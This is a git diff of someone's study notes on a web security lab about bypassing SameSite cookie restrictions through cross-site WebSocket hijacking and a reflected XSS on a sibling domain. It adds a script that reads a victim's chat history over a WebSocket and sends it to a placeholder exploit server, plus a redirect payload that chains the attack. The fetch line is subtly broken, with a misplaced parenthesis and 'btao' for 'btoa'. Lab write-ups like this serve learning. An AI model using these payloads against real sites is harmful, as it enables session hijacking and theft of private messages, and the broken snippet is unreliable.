@@ -40,12 +40,16 @@ If the site is redirecting then find a script that is doing the redirect, study 
 #### Bypassing SameSite restrictions via vulnerable sibling domains
 
 In addition to classic `CSRF`, don't forget that if the target website supports `WebSockets`, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake. 
-##### lab:
+##### Lab:
 in the lab we have a chat feature that uses websockets, when capturing the request on burp we see that we send a ready message and the websocket server responds with the entire chat history that is tied to our session cookie
 in http history find a response that mentions switching protocol in that corresponding request check if the request contains all the points for it to be CSRF vulnerable. 
 ###### samesite: None
+ 
+with no restrictions we can add the following script on our website 
+once the victim has visited the page we see that we can see the chat message from our victim now but because of the same site equals strict session cookie restriction we're only seeing chat messages or the chat message for a new chat session.
 
 ```
+<script>
 var webSocket = new WebSocket("lab-url/chat");
 
 webSocket.onopen = function(evt){
@@ -56,4 +60,23 @@ webSocket.onmessage = function(evt){
 	var message = evt.data;
 	fetch("exploit-server-url/exploit?message=")+btao(message);
 };
+</script>
 ```
+###### samesite: Strict
+
+- If our application was something like a Blog I would look for the comments section and I would check whether the any of the fields in the comment section are vulnerable to a stored cross-site scripting attack because that way we could store our payload in there and send our victim a link to the post that includes our payload that we injected through cross-site scripting
+- but our application is just a product page 
+
+- we see for request with `chat.js` for example we can see that the response header `Access-Control-allow-origin` here reveals an additional sibling domain and it's hosted on the same main domain
+- If there was a stored cross-site scripting or reflected cross-site scripting vulnerability within this endpoint it would still honor the same site restriction
+- since there is a reflected xss vuln on the new domain 
+- we see that the login (new domain) endpoint also accepts our payload as a get request
+- the payload we used in `samesite: None` can be used on the new domain
+- we url encode the whole payload and add it to the url of the new domain 
+- when crafting the payload on the exploit server we write
+```
+<script>
+	document.location="newdomain-url/urlencoded-payload";
+</script>
+```
+#### Bypassing SameSite Lax restrictions with newly issued cookies
